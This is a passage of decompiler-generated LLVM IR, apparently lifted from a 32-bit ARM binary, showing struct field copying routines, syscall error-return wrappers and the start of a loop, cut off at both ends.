  %v4_136ec = inttoptr i32 %v3_136ec to i32*
  %v5_136ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_136ec, i32* %v4_136ec, align 4
  %v2_136f0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_136f0, i32* %r4.global-to-local, align 4
  ret i32 %v2_136c8

; uselistorder directives
  uselistorder i32 %v0_136c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_13698, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 1, 0 }
  uselistorder i32 104, { 4, 0, 1, 2, 5, 3, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_136f8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_136f8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_136f8 = load i32, i32* @r4, align 4
  store i32 %v3_136f8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_13710 = inttoptr i32 %arg2 to i8*
  %v3_13710 = call i32 @function_10a80(i8* %v2_13710, i32 0)
  %v2_13714 = load i32, i32* %arg1, align 4
  %v3_13714 = add i32 %tmp, 4
  %v4_13714 = inttoptr i32 %v3_13714 to i32*
  %v5_13714 = load i32, i32* %v4_13714, align 4
  store i32 %v5_13714, i32* %r4.global-to-local, align 4
  %v0_13718 = load i32, i32* %r6.global-to-local, align 4
  %v1_13718 = inttoptr i32 %v0_13718 to i32*
  store i32 %v2_13714, i32* %v1_13718, align 4
  %v3_13718 = add i32 %v0_13718, 4
  %v4_13718 = inttoptr i32 %v3_13718 to i32*
  %v5_13718 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13718, i32* %v4_13718, align 4
  %v0_1371c = load i32, i32* %r5.global-to-local, align 4
  %v1_1371c = add i32 %v0_1371c, 32
  %v1_13720 = inttoptr i32 %v1_1371c to i32*
  %v2_13720 = load i32, i32* %v1_13720, align 4
  %v3_13720 = add i32 %v0_1371c, 36
  %v4_13720 = inttoptr i32 %v3_13720 to i32*
  %v5_13720 = load i32, i32* %v4_13720, align 4
  store i32 %v5_13720, i32* %r4.global-to-local, align 4
  %v1_13724 = add i32 %v0_1371c, 96
  %v2_13724 = inttoptr i32 %v1_13724 to i32*
  %v3_13724 = load i32, i32* %v2_13724, align 4
  store i32 %v3_13724, i32* %r2.global-to-local, align 4
  %v1_13728 = load i32, i32* %r6.global-to-local, align 4
  %v2_13728 = add i32 %v1_13728, 32
  %v3_13728 = inttoptr i32 %v2_13728 to i32*
  store i32 %v2_13720, i32* %v3_13728, align 4
  %v0_1372c = load i32, i32* %r4.global-to-local, align 4
  %v1_1372c = load i32, i32* %r6.global-to-local, align 4
  %v2_1372c = add i32 %v1_1372c, 36
  %v3_1372c = inttoptr i32 %v2_1372c to i32*
  store i32 %v0_1372c, i32* %v3_1372c, align 4
  %v0_13730 = load i32, i32* %r2.global-to-local, align 4
  %v1_13730 = load i32, i32* %r6.global-to-local, align 4
  %v2_13730 = add i32 %v1_13730, 12
  %v3_13730 = inttoptr i32 %v2_13730 to i32*
  store i32 %v0_13730, i32* %v3_13730, align 4
  %v0_13734 = load i32, i32* %r5.global-to-local, align 4
  %v1_13734 = add i32 %v0_13734, 48
  %v2_13734 = inttoptr i32 %v1_13734 to i32*
  %v3_13734 = load i32, i32* %v2_13734, align 4
  %v1_13738 = add i32 %v0_13734, 24
  store i32 %v1_13738, i32* %ip.global-to-local, align 4
  %v1_1373c = inttoptr i32 %v1_13738 to i32*
  %v2_1373c = load i32, i32* %v1_1373c, align 4
  store i32 %v2_1373c, i32* %ip.global-to-local, align 4
  %v3_1373c = add i32 %v0_13734, 28
  %v4_1373c = inttoptr i32 %v3_1373c to i32*
  %v5_1373c = load i32, i32* %v4_1373c, align 4
  store i32 %v5_1373c, i32* %lr.global-to-local, align 4
  %v1_13740 = load i32, i32* %r6.global-to-local, align 4
  %v2_13740 = add i32 %v1_13740, 44
  %v3_13740 = inttoptr i32 %v2_13740 to i32*
  store i32 %v3_13734, i32* %v3_13740, align 4
  %v0_13744 = load i32, i32* %r5.global-to-local, align 4
  %v1_13744 = add i32 %v0_13744, 64
  %v2_13744 = inttoptr i32 %v1_13744 to i32*
  %v3_13744 = load i32, i32* %v2_13744, align 4
  %v1_13748 = add i32 %v0_13744, 56
  %v2_13748 = inttoptr i32 %v1_13748 to i32*
  %v3_13748 = load i32, i32* %v2_13748, align 4
  store i32 %v3_13748, i32* %r2.global-to-local, align 4
  %v1_1374c = load i32, i32* %r6.global-to-local, align 4
  %v2_1374c = add i32 %v1_1374c, 52
  %v3_1374c = inttoptr i32 %v2_1374c to i32*
  store i32 %v3_13744, i32* %v3_1374c, align 4
  %v0_13750 = load i32, i32* %r2.global-to-local, align 4
  %v1_13750 = load i32, i32* %r6.global-to-local, align 4
  %v2_13750 = add i32 %v1_13750, 48
  %v3_13750 = inttoptr i32 %v2_13750 to i32*
  store i32 %v0_13750, i32* %v3_13750, align 4
  %v0_13754 = load i32, i32* %r5.global-to-local, align 4
  %v1_13754 = add i32 %v0_13754, 72
  %v1_13758 = inttoptr i32 %v1_13754 to i32*
  %v2_13758 = load i32, i32* %v1_13758, align 4
  %v3_13758 = add i32 %v0_13754, 76
  %v4_13758 = inttoptr i32 %v3_13758 to i32*
  %v5_13758 = load i32, i32* %v4_13758, align 4
  store i32 %v5_13758, i32* %r1.global-to-local, align 4
  %v0_1375c = load i32, i32* %r6.global-to-local, align 4
  %v1_1375c = add i32 %v0_1375c, 56
  %v1_13760 = inttoptr i32 %v1_1375c to i32*
  store i32 %v2_13758, i32* %v1_13760, align 4
  %v3_13760 = add i32 %v0_1375c, 60
  %v4_13760 = inttoptr i32 %v3_13760 to i32*
  %v5_13760 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13760, i32* %v4_13760, align 4
  %v0_13764 = load i32, i32* %r5.global-to-local, align 4
  %v1_13764 = add i32 %v0_13764, 80
  %v1_13768 = inttoptr i32 %v1_13764 to i32*
  %v2_13768 = load i32, i32* %v1_13768, align 4
  %v3_13768 = add i32 %v0_13764, 84
  %v4_13768 = inttoptr i32 %v3_13768 to i32*
  %v5_13768 = load i32, i32* %v4_13768, align 4
  store i32 %v5_13768, i32* %r1.global-to-local, align 4
  %v0_1376c = load i32, i32* %r6.global-to-local, align 4
  %v1_1376c = add i32 %v0_1376c, 64
  %v1_13770 = inttoptr i32 %v1_1376c to i32*
  store i32 %v2_13768, i32* %v1_13770, align 4
  %v3_13770 = add i32 %v0_1376c, 68
  %v4_13770 = inttoptr i32 %v3_13770 to i32*
  %v5_13770 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13770, i32* %v4_13770, align 4
  %v0_13774 = load i32, i32* %r5.global-to-local, align 4
  %v1_13774 = add i32 %v0_13774, 16
  %v2_13774 = inttoptr i32 %v1_13774 to i32*
  %v3_13774 = load i32, i32* %v2_13774, align 4
  %v1_13778 = load i32, i32* %r6.global-to-local, align 4
  %v2_13778 = add i32 %v1_13778, 16
  %v3_13778 = inttoptr i32 %v2_13778 to i32*
  store i32 %v3_13774, i32* %v3_13778, align 4
  %v0_1377c = load i32, i32* %r5.global-to-local, align 4
  %v1_1377c = add i32 %v0_1377c, 88
  %v1_13780 = add i32 %v0_1377c, 20
  %v2_13780 = inttoptr i32 %v1_13780 to i32*
  %v3_13780 = load i32, i32* %v2_13780, align 4
  store i32 %v3_13780, i32* %r2.global-to-local, align 4
  %v1_13784 = inttoptr i32 %v1_1377c to i32*
  %v2_13784 = load i32, i32* %v1_13784, align 4
  %v3_13784 = add i32 %v0_1377c, 92
  %v4_13784 = inttoptr i32 %v3_13784 to i32*
  %v5_13784 = load i32, i32* %v4_13784, align 4
  store i32 %v5_13784, i32* %r1.global-to-local, align 4
  %v0_13788 = load i32, i32* %r6.global-to-local, align 4
  %v1_13788 = add i32 %v0_13788, 72
  %v1_1378c = inttoptr i32 %v1_13788 to i32*
  store i32 %v2_13784, i32* %v1_1378c, align 4
  %v3_1378c = add i32 %v0_13788, 76
  %v4_1378c = inttoptr i32 %v3_1378c to i32*
  %v5_1378c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1378c, i32* %v4_1378c, align 4
  %v0_13790 = load i32, i32* %r2.global-to-local, align 4
  %v1_13790 = load i32, i32* %r6.global-to-local, align 4
  %v2_13790 = add i32 %v1_13790, 20
  %v3_13790 = inttoptr i32 %v2_13790 to i32*
  store i32 %v0_13790, i32* %v3_13790, align 4
  %v0_13794 = load i32, i32* %ip.global-to-local, align 4
  %v1_13794 = load i32, i32* %r6.global-to-local, align 4
  %v2_13794 = add i32 %v1_13794, 24
  %v3_13794 = inttoptr i32 %v2_13794 to i32*
  store i32 %v0_13794, i32* %v3_13794, align 4
  %v0_13798 = load i32, i32* %lr.global-to-local, align 4
  %v1_13798 = load i32, i32* %r6.global-to-local, align 4
  %v2_13798 = add i32 %v1_13798, 28
  %v3_13798 = inttoptr i32 %v2_13798 to i32*
  store i32 %v0_13798, i32* %v3_13798, align 4
  %v2_1379c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1379c, i32* %r4.global-to-local, align 4
  ret i32 %v2_13784

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_137a4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_137a4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_137c0 = inttoptr i32 %arg2 to i8*
  %v3_137c0 = call i32 @function_10a80(i8* %v2_137c0, i32 0)
  %v1_137c4 = add i32 %tmp, 4
  %v2_137c4 = inttoptr i32 %v1_137c4 to i32*
  %v3_137c4 = load i32, i32* %v2_137c4, align 4
  %v2_137c8 = load i32, i32* %arg1, align 4
  store i32 %v2_137c8, i32* %r8.global-to-local, align 4
  %v1_137cc = load i32, i32* %r5.global-to-local, align 4
  %v2_137cc = add i32 %v1_137cc, 12
  %v3_137cc = inttoptr i32 %v2_137cc to i32*
  store i32 %v3_137c4, i32* %v3_137cc, align 4
  %v0_137d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_137d0 = add i32 %v0_137d0, 20
  %v2_137d0 = inttoptr i32 %v1_137d0 to i32*
  %v3_137d0 = load i32, i32* %v2_137d0, align 4
  %v1_137d4 = add i32 %v0_137d0, 16
  %v2_137d4 = inttoptr i32 %v1_137d4 to i32*
  %v3_137d4 = load i32, i32* %v2_137d4, align 4
  store i32 %v3_137d4, i32* %r6.global-to-local, align 4
  %v1_137d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_137d8 = add i32 %v1_137d8, 44
  %v3_137d8 = inttoptr i32 %v2_137d8 to i32*
  store i32 %v3_137d0, i32* %v3_137d8, align 4
  %v0_137dc = load i32, i32* %r4.global-to-local, align 4
  %v1_137dc = add i32 %v0_137dc, 24
  %v2_137dc = inttoptr i32 %v1_137dc to i32*
  %v3_137dc = load i32, i32* %v2_137dc, align 4
  %v1_137e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_137e0 = add i32 %v1_137e0, 48
  %v3_137e0 = inttoptr i32 %v2_137e0 to i32*
  store i32 %v3_137dc, i32* %v3_137e0, align 4
  %v0_137e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_137e4 = add i32 %v0_137e4, 28
  %v2_137e4 = inttoptr i32 %v1_137e4 to i32*
  %v3_137e4 = load i32, i32* %v2_137e4, align 4
  %v1_137e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_137e8 = add i32 %v1_137e8, 52
  %v3_137e8 = inttoptr i32 %v2_137e8 to i32*
  store i32 %v3_137e4, i32* %v3_137e8, align 4
  %v0_137ec = load i32, i32* %r4.global-to-local, align 4
  %v1_137ec = add i32 %v0_137ec, 32
  %v1_137f0 = inttoptr i32 %v1_137ec to i32*
  %v2_137f0 = load i32, i32* %v1_137f0, align 4
  %v3_137f0 = add i32 %v0_137ec, 36
  %v4_137f0 = inttoptr i32 %v3_137f0 to i32*
  %v5_137f0 = load i32, i32* %v4_137f0, align 4
  store i32 %v5_137f0, i32* %r1.global-to-local, align 4
  %v0_137f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_137f4 = add i32 %v0_137f4, 56
  %v1_137f8 = inttoptr i32 %v1_137f4 to i32*
  store i32 %v2_137f0, i32* %v1_137f8, align 4
  %v3_137f8 = add i32 %v0_137f4, 60
  %v4_137f8 = inttoptr i32 %v3_137f8 to i32*
  %v5_137f8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_137f8, i32* %v4_137f8, align 4
  %v0_137fc = load i32, i32* %r4.global-to-local, align 4
  %v1_137fc = add i32 %v0_137fc, 40
  %v1_13800 = inttoptr i32 %v1_137fc to i32*
  %v2_13800 = load i32, i32* %v1_13800, align 4
  %v3_13800 = add i32 %v0_137fc, 44
  %v4_13800 = inttoptr i32 %v3_13800 to i32*
  %v5_13800 = load i32, i32* %v4_13800, align 4
  store i32 %v5_13800, i32* %r1.global-to-local, align 4
  %v0_13804 = load i32, i32* %r5.global-to-local, align 4
  %v1_13804 = add i32 %v0_13804, 64
  %v1_13808 = inttoptr i32 %v1_13804 to i32*
  store i32 %v2_13800, i32* %v1_13808, align 4
  %v3_13808 = add i32 %v0_13804, 68
  %v4_13808 = inttoptr i32 %v3_13808 to i32*
  %v5_13808 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13808, i32* %v4_13808, align 4
  %v0_1380c = load i32, i32* %r4.global-to-local, align 4
  %v1_1380c = add i32 %v0_1380c, 48
  %v1_13810 = inttoptr i32 %v1_1380c to i32*
  %v2_13810 = load i32, i32* %v1_13810, align 4
  %v3_13810 = add i32 %v0_1380c, 52
  %v4_13810 = inttoptr i32 %v3_13810 to i32*
  %v5_13810 = load i32, i32* %v4_13810, align 4
  store i32 %v5_13810, i32* %r1.global-to-local, align 4
  %v1_13814 = add i32 %v0_1380c, 8
  %v2_13814 = inttoptr i32 %v1_13814 to i16*
  %v3_13814 = load i16, i16* %v2_13814, align 2
  %v4_13814 = zext i16 %v3_13814 to i32
  store i32 %v4_13814, i32* %r2.global-to-local, align 4
  %v1_13818 = add i32 %v0_1380c, 10
  %v2_13818 = inttoptr i32 %v1_13818 to i16*
  %v3_13818 = load i16, i16* %v2_13818, align 2
  %v4_13818 = zext i16 %v3_13818 to i32
  store i32 %v4_13818, i32* %ip.global-to-local, align 4
  %v1_1381c = add i32 %v0_1380c, 12
  %v2_1381c = inttoptr i32 %v1_1381c to i16*
  %v3_1381c = load i16, i16* %v2_1381c, align 2
  %v4_1381c = zext i16 %v3_1381c to i32
  store i32 %v4_1381c, i32* %lr.global-to-local, align 4
  %v1_13820 = add i32 %v0_1380c, 14
  %v2_13820 = inttoptr i32 %v1_13820 to i16*
  %v3_13820 = load i16, i16* %v2_13820, align 2
  %v4_13820 = zext i16 %v3_13820 to i32
  store i32 %v4_13820, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1382c = load i32, i32* %r5.global-to-local, align 4
  %v1_1382c = add i32 %v0_1382c, 72
  %v1_13830 = inttoptr i32 %v1_1382c to i32*
  store i32 %v2_13810, i32* %v1_13830, align 4
  %v3_13830 = add i32 %v0_1382c, 76
  %v4_13830 = inttoptr i32 %v3_13830 to i32*
  %v5_13830 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13830, i32* %v4_13830, align 4
  %v0_13834 = load i32, i32* %r5.global-to-local, align 4
  %v1_13834 = inttoptr i32 %v0_13834 to i32*
  %v2_13834 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_13834, i32* %v1_13834, align 4
  %v3_13834 = add i32 %v0_13834, 4
  %v4_13834 = inttoptr i32 %v3_13834 to i32*
  %v5_13834 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_13834, i32* %v4_13834, align 4
  %v0_13838 = load i32, i32* %r6.global-to-local, align 4
  %v1_13838 = load i32, i32* %r5.global-to-local, align 4
  %v2_13838 = add i32 %v1_13838, 32
  %v3_13838 = inttoptr i32 %v2_13838 to i32*
  store i32 %v0_13838, i32* %v3_13838, align 4
  %v0_1383c = load i32, i32* %r7.global-to-local, align 4
  %v1_1383c = load i32, i32* %r5.global-to-local, align 4
  %v2_1383c = add i32 %v1_1383c, 36
  %v3_1383c = inttoptr i32 %v2_1383c to i32*
  store i32 %v0_1383c, i32* %v3_1383c, align 4
  %v0_13840 = load i32, i32* %r2.global-to-local, align 4
  %v1_13840 = load i32, i32* %r5.global-to-local, align 4
  %v2_13840 = add i32 %v1_13840, 16
  %v3_13840 = inttoptr i32 %v2_13840 to i32*
  store i32 %v0_13840, i32* %v3_13840, align 4
  %v0_13844 = load i32, i32* %ip.global-to-local, align 4
  %v1_13844 = load i32, i32* %r5.global-to-local, align 4
  %v2_13844 = add i32 %v1_13844, 20
  %v3_13844 = inttoptr i32 %v2_13844 to i32*
  store i32 %v0_13844, i32* %v3_13844, align 4
  %v0_13848 = load i32, i32* %lr.global-to-local, align 4
  %v1_13848 = load i32, i32* %r5.global-to-local, align 4
  %v2_13848 = add i32 %v1_13848, 24
  %v3_13848 = inttoptr i32 %v2_13848 to i32*
  store i32 %v0_13848, i32* %v3_13848, align 4
  %v0_1384c = load i32, i32* %r4.global-to-local, align 4
  %v1_1384c = load i32, i32* %r5.global-to-local, align 4
  %v2_1384c = add i32 %v1_1384c, 28
  %v3_1384c = inttoptr i32 %v2_1384c to i32*
  store i32 %v0_1384c, i32* %v3_1384c, align 4
  ret i32 %v2_13810

; uselistorder directives
  uselistorder i32 %v0_1380c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 68, { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 60, { 3, 4, 1, 5, 6, 0, 2, 7 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @function_1385c() local_unnamed_addr {
dec_label_pc_1385c:
  %stack_var_-16 = alloca i32, align 4
  %v2_13860 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1386c = call i32 @function_15598(i32 7, i32 %v2_13860)
  %v1_13870 = icmp slt i32 %v2_1386c, 0
  %v5_13874 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_13870, i32 256, i32 %v5_13874
  ret i32 %storemerge
}

define i32 @function_13888(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13888:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13888 = load i32, i32* @r7, align 4
  store i32 %v3_13888, i32* %stack_var_-8, align 4
  %v0_13894 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13894, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13894, -4095
  br i1 %tmp, label %dec_label_pc_138b4, label %dec_label_pc_138a4

dec_label_pc_138a4:                               ; preds = %dec_label_pc_13888
  %v0_138a4 = call i32 @function_10a30()
  %v0_138a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_138a8 = sub i32 0, %v0_138a8
  %v2_138ac = inttoptr i32 %v0_138a4 to i32*
  store i32 %v1_138a8, i32* %v2_138ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_138b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_138b4

dec_label_pc_138b4:                               ; preds = %dec_label_pc_13888, %dec_label_pc_138a4
  %v1_138b8 = phi i32 [ %v0_13894, %dec_label_pc_13888 ], [ -1, %dec_label_pc_138a4 ]
  %v2_138b4 = phi i32 [ %v3_13888, %dec_label_pc_13888 ], [ %v2_138b4.pre, %dec_label_pc_138a4 ]
  store i32 %v2_138b4, i32* @r7, align 4
  ret i32 %v1_138b8

; uselistorder directives
  uselistorder i32 %v0_13894, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_138b4, { 1, 0 }
}

define i32 @function_138bc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_138bc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_138bc = load i32, i32* @r7, align 4
  store i32 %v3_138bc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_138e4, label %dec_label_pc_138d4

dec_label_pc_138d4:                               ; preds = %dec_label_pc_138bc
  %v0_138d4 = call i32 @function_10a30()
  %v0_138d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_138d8 = sub i32 0, %v0_138d8
  %v2_138dc = inttoptr i32 %v0_138d4 to i32*
  store i32 %v1_138d8, i32* %v2_138dc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_138e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_138e4

dec_label_pc_138e4:                               ; preds = %dec_label_pc_138bc, %dec_label_pc_138d4
  %v2_138e8 = phi i32 [ %v3_138bc, %dec_label_pc_138bc ], [ %v2_138e8.pre, %dec_label_pc_138d4 ]
  %v0_138e4 = phi i32 [ %arg1, %dec_label_pc_138bc ], [ -1, %dec_label_pc_138d4 ]
  store i32 %v2_138e8, i32* @r7, align 4
  ret i32 %v0_138e4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138e4, { 1, 0 }
}

define i32 @function_138f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_138f0:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13924, label %dec_label_pc_13914

dec_label_pc_13914:                               ; preds = %dec_label_pc_138f0
  %v0_13914 = call i32 @function_10a30()
  %v0_13918 = load i32, i32* %r4.global-to-local, align 4
  %v1_13918 = sub i32 0, %v0_13918
  %v2_1391c = inttoptr i32 %v0_13914 to i32*
  store i32 %v1_13918, i32* %v2_1391c, align 4
  br label %dec_label_pc_13924

dec_label_pc_13924:                               ; preds = %dec_label_pc_138f0, %dec_label_pc_13914
  %v1_1392c = phi i32 [ %arg1, %dec_label_pc_138f0 ], [ -1, %dec_label_pc_13914 ]
  ret i32 %v1_1392c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13924, { 1, 0 }
}

define i32 @function_13930(i32 %arg1) local_unnamed_addr {
dec_label_pc_13930:
  %v1_13940 = load i32, i32* @r0, align 4
  ret i32 %v1_13940
}

define i32 @function_13944(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13944:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13944 = load i32, i32* @r7, align 4
  store i32 %v3_13944, i32* %stack_var_-8, align 4
  %v0_13950 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13950, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13950, -4095
  br i1 %tmp, label %dec_label_pc_13970, label %dec_label_pc_13960

dec_label_pc_13960:                               ; preds = %dec_label_pc_13944
  %v0_13960 = call i32 @function_10a30()
  %v0_13964 = load i32, i32* %r7.global-to-local, align 4
  %v1_13964 = sub i32 0, %v0_13964
  store i32 %v1_13964, i32* @r3, align 4
  %v2_13968 = inttoptr i32 %v0_13960 to i32*
  store i32 %v1_13964, i32* %v2_13968, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13970.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13970

dec_label_pc_13970:                               ; preds = %dec_label_pc_13944, %dec_label_pc_13960
  %v1_13974 = phi i32 [ %v0_13950, %dec_label_pc_13944 ], [ -1, %dec_label_pc_13960 ]
  %v2_13970 = phi i32 [ %v3_13944, %dec_label_pc_13944 ], [ %v2_13970.pre, %dec_label_pc_13960 ]
  store i32 %v2_13970, i32* @r7, align 4
  ret i32 %v1_13974

; uselistorder directives
  uselistorder i32 %v0_13950, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13970, { 1, 0 }
}

define i32 @function_13978(i32 %arg1) local_unnamed_addr {
dec_label_pc_13978:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1397c.outer

dec_label_pc_1397c.outer:                         ; preds = %dec_label_pc_13994, %dec_label_pc_13978
  %v0_1397c.ph = phi i32 [ %v0_1397c.pre.pre, %dec_label_pc_13994 ], [ %arg1, %dec_label_pc_13978 ]
  %tmp = icmp ult i32 %v0_1397c.ph, -4095
  br label %dec_label_pc_1397c

dec_label_pc_1397c:                               ; preds = %dec_label_pc_1397c.outer, %dec_label_pc_1397c
  br i1 %tmp, label %dec_label_pc_1397c, label %dec_label_pc_13994

dec_label_pc_13994:                               ; preds = %dec_label_pc_1397c
  %v0_13994 = call i32 @function_10a30()
  %v1_13998 = sub i32 0, %v0_1397c.ph
  %v2_1399c = inttoptr i32 %v0_13994 to i32*
  store i32 %v1_13998, i32* %v2_1399c, align 4
  %v0_1397c.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1397c.outer

; uselistorder directives
  uselistorder i32 %v0_1397c.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1397c, { 1, 0 }
}

define i32 @function_139a4(i32* %arg1) local_unnamed_addr {
dec_label_pc_139a4:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 123764, i32* @r6, align 4
  %v1_139b8 = add i32 %tmp, 24
  store i32 %v1_139b8, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_139d0 = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  store i32 %v4_139d0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_139d0)
  %v0_139e4 = load i32, i32* @r6, align 4
  %v2_139e4 = add i32 %v0_139e4, 16
  %v3_139e4 = inttoptr i32 %v2_139e4 to i32*
  %v4_139e4 = load i32, i32* %v3_139e4, align 4
  store i32 %v4_139e4, i32* %ip.global-to-local, align 4
  store i32 80368, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_139e4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_139f4

dec_label_pc_139f4:                               ; preds = %dec_label_pc_13a24, %dec_label_pc_139a4
  %v0_139f4 = load i32, i32* @r5, align 4
  %v1_139f4 = add i32 %v0_139f4, 4
  %v2_139f4 = inttoptr i32 %v1_139f4 to i32*
  %v3_139f4 = load i32, i32* %v2_139f4, align 4
  %v4_139f4 = add i32 %v0_139f4, 8
  %v5_139f4 = inttoptr i32 %v4_139f4 to i32*
  %v6_139f4 = load i32, i32* %v5_139f4, align 4
  %tmp10 = icmp ugt i32 %v6_139f4, %v3_139f4
  br i1 %tmp10, label %dec_label_pc_13a24, label %dec_label_pc_13a00

dec_label_pc_13a00:                               ; preds = %dec_label_pc_139f4
  %v1_13a00 = inttoptr i32 %v0_139f4 to i32*
  %v2_13a00 = load i32, i32* %v1_13a00, align 4
  %v1_13a04 = add i32 %v0_139f4, 12
  %v2_13a04 = inttoptr i32 %v1_13a04 to i32*
  %v3_13a04 = load i32, i32* %v2_13a04, align 4
  %v1_13a08 = add i32 %v0_139f4, 20
  %v2_13a08 = inttoptr i32 %v1_13a08 to i32*
  %v3_13a08 = load i32, i32* %v2_13a08, align 4
  %v4_13a0c = inttoptr i32 %v3_13a04 to i32*
